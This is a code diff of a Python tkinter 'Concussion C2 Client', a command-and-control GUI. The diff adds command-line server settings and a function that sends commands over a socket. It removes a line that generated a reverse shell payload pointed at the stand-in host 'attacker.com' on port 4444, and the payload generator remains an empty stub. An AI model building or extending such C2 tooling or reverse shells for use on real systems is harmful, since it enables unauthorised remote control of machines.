@@ -1,31 +1,57 @@
 import tkinter as tk
 import socket
 import threading
+import argparse
+
+# Create an argument parser to specify server IP and port
+parser = argparse.ArgumentParser(description="Concussion C2 Client")
+parser.add_argument('--server-ip', default='0.0.0.0', help="Server IP")
+parser.add_argument('--server-port', type=int, default=8081, help="Server port")
+args = parser.parse_args()
 
 # Define the server's IP address and port
-SERVER_IP = '0.0.0.0'
-SERVER_PORT = 8081
+SERVER_IP = args.server_ip
+SERVER_PORT = args.server_port
 
 # Create the main application window
 root = tk.Tk()
 root.title("Concussion C2 Client")
 root.geometry("700x500")  # Adjust the window size as needed
-root.configure(bg="#000046")
 
 # Define the common color scheme
-#primary_color = "#3498db"
-#secondary_color = "#2ecc71"
-#background_color = "#000046"
-#text_color = "#00C8FF"
+root.configure(bg="#000046")
 
-root.configure(bg=background_color)
-
+# Function to handle the send command button click
 def send_command():
-    # Generate a reverse shell payload
-    reverse_shell_payload = generate_reverse_shell_payload("attacker.com", 4444)
-    
-    # Send the payload to the server
-    send_payload(reverse_shell_payload)
+    command = command_var.get()
+    if command:
+        if command.startswith("redirect"):
+            # Handle a redirect command
+            redirect_command, target_ip, target_port = command.split(' ')
+            handle_redirect(target_ip, int(target_port))
+            update_status(f"Redirected to {target_ip}:{target_port}.")
+        else:
+            send_request(command)
+
+
+# Function to handle a redirect command
+def handle_redirect(target_ip, target_port):
+    global redirect_target
+    redirect_target = (target_ip, target_port)
+
+# Function to send a request to the server
+def send_request(request):
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((SERVER_IP, SERVER_PORT))
+        client_socket.send(request.encode('utf-8'))
+
+        response_data = client_socket.recv(1024).decode('utf-8')
+        response_label.config(text=response_data)
+
+        client_socket.close()
+    except Exception as e:
+        print(f"Error: {e}")
 
 def generate_reverse_shell_payload(ip, port):
     # Implement logic to generate a reverse shell payload
